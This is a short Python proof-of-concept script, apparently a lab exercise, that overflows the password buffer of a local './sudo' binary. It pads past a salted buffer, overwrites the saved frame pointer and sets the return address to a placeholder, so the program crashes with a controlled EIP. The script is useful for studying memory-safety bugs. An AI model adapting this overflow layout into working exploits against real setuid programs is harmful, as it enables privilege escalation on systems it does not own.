import os, sys


PATH_TO_SUDO = './sudo'


def get_crash_arg():
    buff = 'a' * (0x49 - len("thisisasalt"))
    old_ebp = 'b' * 4
    ret = 'cdef' # overflow ret/eip value
    password = buff + old_ebp + ret
    return password


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_crash_arg());


if __name__ == '__main__':
    main(sys.argv)
